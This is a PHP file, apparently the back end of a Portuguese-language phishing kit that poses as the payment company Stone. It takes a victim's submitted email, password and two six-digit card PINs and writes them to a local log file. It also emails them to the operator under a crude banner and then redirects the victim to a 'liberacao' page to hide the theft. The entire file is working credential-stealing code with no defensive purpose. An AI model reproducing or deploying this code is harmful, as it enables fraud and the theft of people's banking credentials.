<?php 
require './system/autoload.php';
header("Content-type: text/html; charset=utf-8");

$email = $_POST['email'];
$senha = $_POST['password'];
$senha6 = $_POST['senha6'];
$senhaRetry = $_POST['senhacard2'];

$teste = "<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<div>
=====CHEGOU INFO FDP=====<br>
=========================<br>
EMAIL: $email <br>
SENHA: $senha <br>
SENHA6: $senha6 <br>
SENHA6 CONFIRMADA: $senhaRetry <br>
=========================
</div>
</body>
</html>
";

function gravar($texto){
	//Variável arquivo armazena o nome e extensão do arquivo.
	$arquivo = "meu_arquivo.txt";
	
	//Variável $fp armazena a conexão com o arquivo e o tipo de ação.
	$fp = fopen($arquivo, "a+");

	//Escreve no arquivo aberto.
	fwrite($fp, $texto);
	
	//Fecha o arquivo.
	fclose($fp);
}

gravar($teste);

new EnviarEmail('[STONE]',$teste,"STONE");

header("location:liberacao.php");
 ?>
